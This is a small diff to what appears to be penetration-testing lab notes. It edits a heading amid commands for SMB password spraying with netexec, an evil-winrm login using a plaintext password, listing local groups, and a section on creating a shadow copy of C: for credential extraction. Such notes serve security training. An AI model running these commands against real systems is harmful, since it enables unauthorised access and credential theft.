@@ -213,7 +213,7 @@ netexec smb 10.129.111.214 -u posi -p passwords2
 ```
 evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 
-## Checking Local Group Membership
+## Checking Local Group Membership of Administrators 
 *Evil-WinRM* PS C:\> net localgroup
 
 ## Creating Shadow Copy of C:
